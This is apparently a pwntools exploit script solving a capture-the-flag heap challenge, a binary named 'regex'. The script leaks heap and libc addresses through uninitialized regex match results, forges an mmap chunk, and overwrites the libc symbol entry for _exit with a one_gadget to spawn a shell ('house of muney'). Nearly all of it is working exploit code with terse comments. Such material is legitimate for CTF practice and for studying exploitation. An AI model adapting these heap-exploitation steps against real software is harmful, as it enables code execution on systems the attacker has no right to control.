from pwn import *

#init

e = ELF('./regex')
libc = ELF('./libc-2.31.so')

p = process(e.path)

#funcs

def inp(x, s = b''):
    p.sendlineafter(':', str(x - 1))
    p.sendlineafter(':', s)

def mstr(x, y, s = b'', t = True):
    p.sendlineafter(':', str(x - 1))
    p.sendlineafter(':', s)
    p.sendlineafter(':', str(y // 0x8 - 1))

    p.recvuntil('[')
    z = list(map(int, p.recvuntilS(']', drop = True).split(', ')))

    p.sendlineafter('(y/N)', 'y' if t else 'n')

    ret = 0
    for i in range(0, 2):
        ret |= (((1 << 32) - 1) & (z[i] + i))  << (32 * i)

    return ret

#vars

arena_off = libc.sym['main_arena']
one_gadget = 0xe6af1 
libc_data = libc.read(libc.address, 0xb000)

log.info('Arena libc off: ' + hex(arena_off))
log.info('One gadget off: ' + hex(one_gadget))
log.info('Libc data:\n' + hexdump(libc_data[:0x100]))

#exploit

#free preg with bad regex expr, make it point to other freed tcache

inp(0x48, b'\\')
inp(0x48, b'[z-a]')

#leak heap by changing preg->buffer so regexec return then pmatch uninitialized

heap = mstr(0x48, 0x48) - 0x1af0

log.info('Heap adr: ' + hex(heap))

#leak libc similarly with unsorted bin

mstr(0x48, 0x98)
mstr(0x418, 0x18)
libc_off = mstr(0x98, 0x418) - arena_off - 96

log.info('Libc off adr: ' + hex(libc_off))

#init fake mmap chnk

mstr(0x100, 0x48, b'\x00')
mstr(0x1108, 0x48, b'\x00' * 0xfe0 + p64(0) + p64((libc_off - heap - 0x3000 + 0xb000) | 2) + p64(0))

#point preg->buffer to fake mmap chnk to free during regfree

mstr(0x48, 0x48, p64(heap + 0x3010), False)

#mmap chnk with review to overwrite libc symbol table and call system ie house of muney

libc_craft = libc_data[:0xa8f0].replace(b'\n', b'\x00')

#overwrite _exit Elf64_Sym
libc_craft += p32(0x2efa)
libc_craft += p8(0x12)
libc_craft += p8(0x0)
libc_craft += p16(0x10)
libc_craft += p64(one_gadget)
libc_craft += p64(0x58)

libc_craft += libc_data[len(libc_craft):0xaf00].replace(b'\n', b'\x00')

p.sendlineafter(':', str(0x20f00))
p.sendlineafter(':', b'a' * (0x21000 - 0xb000 - 0x10) + libc_craft)

#pray for flag

p.interactive()
